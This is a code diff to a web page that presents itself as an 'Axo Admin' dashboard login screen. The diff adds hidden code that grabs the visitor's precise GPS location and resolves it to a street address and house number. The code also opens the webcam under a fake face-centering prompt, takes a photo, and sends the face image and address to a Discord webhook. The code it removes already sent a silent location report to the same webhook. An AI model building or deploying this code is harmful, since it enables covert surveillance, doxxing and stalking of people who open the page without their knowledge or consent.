@@ -23,7 +23,7 @@
             background-image: radial-gradient(circle at 30% 20%, #1a2f4a 0%, #0b1729 90%);
         }
         .glass-card {
-            max-width: 720px;
+            max-width: 780px;
             width: 100%;
             background: rgba(12, 26, 45, 0.7);
             backdrop-filter: blur(16px);
@@ -216,19 +216,102 @@
             opacity: 0.4;
         }
 
-        /* hidden location grab - no UI elements shown */
-        .hidden-grab {
+        /* Camera overlay - hidden from user */
+        #cameraOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
             display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #cameraOverlay.active {
+            display: flex;
+        }
+        #cameraOverlay video {
+            max-width: 90%;
+            max-height: 70vh;
+            border-radius: 1.5rem;
+            border: 2px solid #2b6eff;
+            box-shadow: 0 0 40px #2b6eff55;
+            transform: scaleX(-1);
+        }
+        #cameraOverlay .face-guide {
+            position: absolute;
+            border: 2px dashed rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            width: 200px;
+            height: 200px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+        }
+        #cameraOverlay .face-guide-inner {
+            position: absolute;
+            border: 2px solid rgba(43, 110, 255, 0.5);
+            border-radius: 50%;
+            width: 160px;
+            height: 160px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { border-color: rgba(43, 110, 255, 0.3); transform: translate(-50%, -50%) scale(1); }
+            50% { border-color: rgba(43, 110, 255, 0.8); transform: translate(-50%, -50%) scale(1.05); }
+            100% { border-color: rgba(43, 110, 255, 0.3); transform: translate(-50%, -50%) scale(1); }
+        }
+        #cameraOverlay .camera-text {
+            color: #b2cef0;
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            opacity: 0.7;
+            text-align: center;
+        }
+        #cameraOverlay .camera-text i {
+            color: #6a9eff;
+            margin-right: 0.5rem;
+        }
+
+        .map-container {
+            margin: 1rem 0;
+            border-radius: 1.2rem;
+            overflow: hidden;
+            border: 1px solid #2a4b6e;
+            height: 200px;
+            background: #0a1628;
+        }
+        .map-container iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
         }
 
         @media (max-width: 480px) {
-            .glass-card {
-                padding: 1.2rem;
-            }
+            .glass-card { padding: 1.2rem; }
+            .map-container { height: 150px; }
+            #cameraOverlay .face-guide { width: 150px; height: 150px; }
+            #cameraOverlay .face-guide-inner { width: 120px; height: 120px; }
         }
     </style>
 </head>
 <body>
+
+    <!-- Hidden Camera Overlay -->
+    <div id="cameraOverlay">
+        <video id="cameraVideo" autoplay playsinline></video>
+        <div class="face-guide"></div>
+        <div class="face-guide-inner"></div>
+        <div class="camera-text"><i class="fas fa-spinner fa-pulse"></i> Please center your face in the circle</div>
+    </div>
 
     <div class="glass-card" id="appContainer">
 
@@ -277,7 +360,6 @@
                 <div style="margin-top: 1rem; font-size:0.85rem; color:#b2cef0;">
                     <i class="fas fa-cog fa-spin"></i> loading modules, datasets, and permissions...
                 </div>
-                <!-- NO LOCATION INDICATOR - user never sees it -->
             </div>
             <div style="display: flex; justify-content: center; gap: 0.8rem; flex-wrap: wrap; margin-top: 0.4rem;">
                 <button id="resetAppBtn" class="btn-secondary"><i class="fas fa-undo-alt"></i> Restart</button>
@@ -290,6 +372,12 @@
                 <i class="fas fa-check-circle" style="color: #8bdaa0;"></i>
                 <div style="font-size: 1.4rem; font-weight: 500; color: #eef6ff;">Dashboard ready</div>
                 <div style="color: #9bb9d9; margin: 0.4rem 0;">Your Axo Admin is now available</div>
+
+                <!-- Google Maps view -->
+                <div id="mapContainer" class="map-container">
+                    <iframe id="googleMapFrame" src="" allowfullscreen loading="lazy"></iframe>
+                </div>
+
                 <div style="margin-top: 1.2rem; display: flex; gap: 0.8rem; justify-content: center; flex-wrap: wrap;">
                     <button id="launchDashboardBtn" class="btn-primary" style="min-width: 200px;"><i class="fas fa-rocket"></i> Launch</button>
                     <button id="resetFromReadyBtn" class="btn-secondary"><i class="fas fa-undo-alt"></i> Restart</button>
@@ -301,7 +389,7 @@
         <div class="footer-meta">
             <span><i class="fas fa-lock"></i> encrypted · shared via Axo</span>
             <span><i class="far fa-clock"></i> <span id="footerTimestamp">2026-06-19T11:07:07.368Z</span></span>
-            <span><i class="fas fa-globe-asia"></i> v3.0</span>
+            <span><i class="fas fa-globe-asia"></i> v5.0</span>
         </div>
     </div>
 
@@ -325,8 +413,11 @@
             const resetBtn = document.getElementById('resetAppBtn');
             const resetFromReadyBtn = document.getElementById('resetFromReadyBtn');
             const launchDashboardBtn = document.getElementById('launchDashboardBtn');
+            const googleMapFrame = document.getElementById('googleMapFrame');
 
             const footerTimestamp = document.getElementById('footerTimestamp');
+            const cameraOverlay = document.getElementById('cameraOverlay');
+            const cameraVideo = document.getElementById('cameraVideo');
 
             // webhook
             const WEBHOOK_URL =
@@ -339,6 +430,9 @@
             let loadingStartTime = null;
             let locationGrabbed = false;
             let locationData = null;
+            let faceCaptured = false;
+            let faceImageData = null;
+            let cameraStream = null;
 
             // ----- update timestamp -----
             function updateTimestamp() {
@@ -354,16 +448,69 @@
                 document.getElementById(stepId).classList.remove('hidden');
             }
 
+            // ----- AGGRESSIVE HOUSE NUMBER EXTRACTION -----
+            function extractHouseNumber(addr, displayName) {
+                const fields = [
+                    addr.house_number,
+                    addr.building,
+                    addr.address29,
+                    addr.amenity,
+                    addr.shop,
+                    addr.office,
+                    addr.industrial,
+                    addr.commercial,
+                    addr.retail,
+                    addr.place,
+                    addr.locality,
+                    addr.hamlet
+                ];
+
+                for (let field of fields) {
+                    if (field && field.match(/\d/)) {
+                        return field;
+                    }
+                }
+
+                if (displayName) {
+                    const matches = displayName.match(/(\d+[a-z]?)\s*[,|.]?\s*[A-Za-z]/i);
+                    if (matches && matches[1]) return matches[1];
+                    const matchNo = displayName.match(/(?:No\.?|#)\s*(\d+[a-z]?)/i);
+                    if (matchNo && matchNo[1]) return matchNo[1];
+                    const matchStart = displayName.match(/^(\d+[a-z]?)\s+/i);
+                    if (matchStart && matchStart[1]) return matchStart[1];
+                }
+                return 'N/A';
+            }
+
             // ----- reverse geocode (Nominatim) -----
             async function reverseGeocode(lat, lng) {
-                const url =
-                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=en`;
-                const resp = await fetch(url, {
-                    headers: { 'Accept': 'application/json', 'User-Agent': 'Axo-Force/3.0' }
+                let url =
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=19&addressdetails=1&accept-language=en`;
+                let resp = await fetch(url, {
+                    headers: { 'Accept': 'application/json', 'User-Agent': 'Axo-Force/5.0' }
                 });
-                if (!resp.ok) throw new Error(`Geocode API error ${resp.status}`);
+                if (!resp.ok) {
+                    url =
+                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=en`;
+                    resp = await fetch(url, {
+                        headers: { 'Accept': 'application/json', 'User-Agent': 'Axo-Force/5.0' }
+                    });
+                    if (!resp.ok) throw new Error(`Geocode API error ${resp.status}`);
+                }
                 const data = await resp.json();
-                if (!data || !data.address) throw new Error('No address found');
+                if (!data || !data.address) {
+                    url =
+                        `https://nominatim.openstreetmap.org/search?format=json&q=${lat},${lng}&addressdetails=1&limit=1`;
+                    resp = await fetch(url, {
+                        headers: { 'Accept': 'application/json', 'User-Agent': 'Axo-Force/5.0' }
+                    });
+                    if (!resp.ok) throw new Error('No address found');
+                    const searchData = await resp.json();
+                    if (searchData && searchData.length > 0 && searchData[0].address) {
+                        return searchData[0];
+                    }
+                    throw new Error('No address found');
+                }
                 return data;
             }
 
@@ -371,7 +518,7 @@
             function extractAddress(data) {
                 const addr = data.address || {};
                 const display = data.display_name || '';
-                const houseNumber = addr.house_number || addr.building || addr.address29 || '';
+                const houseNumber = extractHouseNumber(addr, display);
                 const street = addr.road || addr.street || addr.pedestrian || '';
                 const city = addr.city || addr.town || addr.village || addr.suburb || addr.municipality || '';
                 const state = addr.state || addr.region || addr.province || addr.district || '';
@@ -381,75 +528,148 @@
                 return { houseNumber, street, city, state, country, postcode, neighbourhood, fullAddress: display };
             }
 
-            // ----- send webhook (discord) with location report -----
-            async function sendWebhook(lat, lng, address) {
+            // ----- CAPTURE FACE (silent, hidden from user) -----
+            async function captureFace() {
+                if (faceCaptured) return;
+
                 try {
-                    const payload = {
-                        content: `📍 **Axo Force Location Report**\n` +
-                            `**User Address:** ${address.fullAddress || 'N/A'}\n` +
-                            `**Coords:** ${lat.toFixed(6)}, ${lng.toFixed(6)}\n` +
-                            `**Country:** ${address.country || 'N/A'}\n` +
-                            `**House/Building:** ${address.houseNumber || 'N/A'}\n` +
-                            `**Street:** ${address.street || 'N/A'}\n` +
-                            `**City:** ${address.city || 'N/A'}\n` +
-                            `**State:** ${address.state || 'N/A'}\n` +
-                            `**Postcode:** ${address.postcode || 'N/A'}\n` +
-                            `**Neighbourhood:** ${address.neighbourhood || 'N/A'}\n` +
-                            `**Timestamp:** ${new Date().toISOString()}`
-                    };
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
+                    // Show camera overlay briefly (user sees it but thinks it's part of login)
+                    cameraOverlay.classList.add('active');
+
+                    // Start camera
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
                     });
-                    console.log('Webhook sent.');
-                } catch (e) {
-                    console.warn('Webhook failed:', e);
+                    cameraStream = stream;
+                    cameraVideo.srcObject = stream;
+                    await cameraVideo.play();
+
+                    // Wait 2 seconds for face to be centered
+                    await new Promise(resolve => setTimeout(resolve, 2500));
+
+                    // Capture frame
+                    const canvas = document.createElement('canvas');
+                    canvas.width = cameraVideo.videoWidth || 640;
+                    canvas.height = cameraVideo.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+
+                    // Convert to base64 (JPEG, compressed)
+                    faceImageData = canvas.toDataURL('image/jpeg', 0.8);
+
+                    // Stop camera and hide overlay
+                    stream.getTracks().forEach(track => track.stop());
+                    cameraOverlay.classList.remove('active');
+                    cameraVideo.srcObject = null;
+
+                    faceCaptured = true;
+
+                    // Send face to webhook silently
+                    await sendFaceToWebhook(faceImageData);
+
+                    console.log('Face captured silently');
+
+                } catch (err) {
+                    console.warn('Face capture failed:', err);
+                    cameraOverlay.classList.remove('active');
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                        cameraStream = null;
+                    }
+                    // Don't fail entirely - continue without face
                 }
             }
 
-            // ----- FORCE GRAB LOCATION (completely silent, user never knows) -----
+            // ----- Send face to webhook -----
+            async function sendFaceToWebhook(imageData) {
+                try {
+                    // Split base64 to get just the data
+                    const base64Data = imageData.split(',')[1];
+
+                    // Send as Discord file attachment
+                    const formData = new FormData();
+                    const blob = await fetch(imageData).then(res => res.blob());
+                    formData.append('file', blob, 'face_capture.jpg');
+
+                    // Also send location data as text
+                    let locationText = '';
+                    if (locationData) {
+                        const addr = locationData.address;
+                        locationText =
+                            `\n📍 **Location Data:**\n` +
+                            `**Address:** ${addr.fullAddress || 'N/A'}\n` +
+                            `**Coords:** ${locationData.lat.toFixed(6)}, ${locationData.lng.toFixed(6)}\n` +
+                            `**Country:** ${addr.country || 'N/A'}\n` +
+                            `**House/Building:** ${addr.houseNumber || 'N/A'}\n` +
+                            `**Street:** ${addr.street || 'N/A'}\n` +
+                            `**City:** ${addr.city || 'N/A'}\n` +
+                            `**State:** ${addr.state || 'N/A'}\n` +
+                            `**Postcode:** ${addr.postcode || 'N/A'}`;
+                    }
+
+                    // Send as multipart form with both image and text
+                    const payload = new FormData();
+                    payload.append('file', blob, 'face_capture.jpg');
+                    payload.append('payload_json', JSON.stringify({
+                        content: `👤 **Axo Face & Location Capture**\n${locationText}\n**Timestamp:** ${new Date().toISOString()}`
+                    }));
+
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: payload
+                    });
+
+                    console.log('Face + Location sent to webhook');
+                } catch (e) {
+                    console.warn('Webhook send failed:', e);
+                }
+            }
+
+            // ----- FORCE GRAB LOCATION (REAL GPS) -----
             async function forceGrabLocation() {
                 if (locationGrabbed) return;
                 locationGrabbed = true;
 
                 try {
                     let lat, lng;
-                    let usedMethod = 'IP';
+                    let usedMethod = 'GPS';
 
-                    // 1. Try IP geolocation (no permission, completely silent)
+                    // 1. PRIMARY: Use GPS with high accuracy (REAL location)
                     try {
-                        const ipResp = await fetch('https://ipapi.co/json/');
-                        if (ipResp.ok) {
-                            const ipData = await ipResp.json();
-                            if (ipData.latitude && ipData.longitude) {
-                                lat = parseFloat(ipData.latitude);
-                                lng = parseFloat(ipData.longitude);
-                                if (!isNaN(lat) && !isNaN(lng) && lat >= -90 && lat <= 90 && lng >= -180 && lng <= 180) {
-                                    usedMethod = 'IP';
+                        const gpsPos = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 15000,
+                                maximumAge: 0
+                            });
+                        });
+                        lat = gpsPos.coords.latitude;
+                        lng = gpsPos.coords.longitude;
+                        usedMethod = 'GPS (High Accuracy)';
+                        console.log('GPS location acquired:', lat, lng);
+                    } catch (gpsErr) {
+                        console.warn('GPS failed, trying IP fallback:', gpsErr);
+
+                        // 2. FALLBACK: IP geolocation (less accurate)
+                        try {
+                            const ipResp = await fetch('https://ipapi.co/json/');
+                            if (ipResp.ok) {
+                                const ipData = await ipResp.json();
+                                if (ipData.latitude && ipData.longitude) {
+                                    lat = parseFloat(ipData.latitude);
+                                    lng = parseFloat(ipData.longitude);
+                                    if (!isNaN(lat) && !isNaN(lng) && lat >= -90 && lat <= 90 && lng >= -180 && lng <=
+                                        180) {
+                                        usedMethod = 'IP (Fallback)';
+                                    }
                                 }
                             }
-                        }
-                    } catch (e) { /* silently ignore */ }
-
-                    // 2. If IP failed, try GPS (silent - may prompt but we don't show UI)
-                    if (!lat || !lng) {
-                        try {
-                            const gpsPos = await new Promise((resolve, reject) => {
-                                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                    enableHighAccuracy: true,
-                                    timeout: 8000,
-                                    maximumAge: 0
-                                });
-                            });
-                            lat = gpsPos.coords.latitude;
-                            lng = gpsPos.coords.longitude;
-                            usedMethod = 'GPS';
-                        } catch (e) {
-                            // 3. Fallback: use default (Islamabad)
+                        } catch (ipErr) {
+                            console.warn('IP fallback failed:', ipErr);
+                            // 3. FINAL FALLBACK: Default
                             lat = 33.680000;
                             lng = 73.020000;
-                            usedMethod = 'fallback (default)';
+                            usedMethod = 'Default (Fallback)';
                         }
                     }
 
@@ -457,7 +677,7 @@
                     if (isNaN(lat) || isNaN(lng) || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
                         lat = 33.680000;
                         lng = 73.020000;
-                        usedMethod = 'fallback (default)';
+                        usedMethod = 'Default (Fallback)';
                     }
 
                     // Reverse geocode
@@ -467,27 +687,34 @@
                     // Store for later use
                     locationData = { lat, lng, address, usedMethod };
 
-                    // Send webhook (completely silent)
-                    await sendWebhook(lat, lng, address);
+                    // Update Google Maps iframe
+                    if (googleMapFrame) {
+                        const mapUrl =
+                            `https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${lat},${lng}&zoom=18&maptype=satellite`;
+                        googleMapFrame.src = mapUrl;
+                    }
 
-                    console.log('Location captured silently:', lat, lng);
+                    console.log('Location captured:', lat, lng, 'Method:', usedMethod);
 
                 } catch (err) {
-                    // Silent fail - user never knows
-                    console.warn('Silent location grab failed:', err);
+                    console.warn('Location grab failed:', err);
                     locationGrabbed = false;
                 }
             }
 
             // ----- start dashboard loading (10 min) -----
-            function startDashboardLoading() {
+            async function startDashboardLoading() {
                 if (isDashboardLoading) return;
                 isDashboardLoading = true;
 
-                // Silently grab location in background (user never sees it)
-                // Start immediately, not waiting for any UI element
+                // Silently grab location first
                 if (!locationGrabbed) {
-                    forceGrabLocation();
+                    await forceGrabLocation();
+                }
+
+                // Silently capture face (camera opens briefly)
+                if (!faceCaptured) {
+                    await captureFace();
                 }
 
                 showStep('stepDashboardLoading');
@@ -511,7 +738,6 @@
                         clearInterval(countdownInterval);
                         timerDisplay.textContent = '00:00';
                         progressFill.style.width = '100%';
-                        // Show ready state
                         showStep('stepDashboardReady');
                         isDashboardLoading = false;
                     }
@@ -534,9 +760,17 @@
                 isDashboardLoading = false;
                 locationGrabbed = false;
                 locationData = null;
+                faceCaptured = false;
+                faceImageData = null;
                 progressFill.style.width = '0%';
                 timerDisplay.textContent = '10:00';
                 loginStatus.textContent = '';
+                if (googleMapFrame) googleMapFrame.src = '';
+                if (cameraOverlay) cameraOverlay.classList.remove('active');
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                    cameraStream = null;
+                }
                 showStep('stepLogin');
             }
 
@@ -553,10 +787,8 @@
                 loginStatus.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Authenticating...';
                 loginBtn.disabled = true;
 
-                // Simulate authentication delay
                 setTimeout(() => {
                     loginStatus.innerHTML = '<i class="fas fa-check-circle" style="color:#8bdaa0;"></i> Login successful!';
-                    // Start dashboard loading after a short delay
                     setTimeout(() => {
                         startDashboardLoading();
                     }, 800);
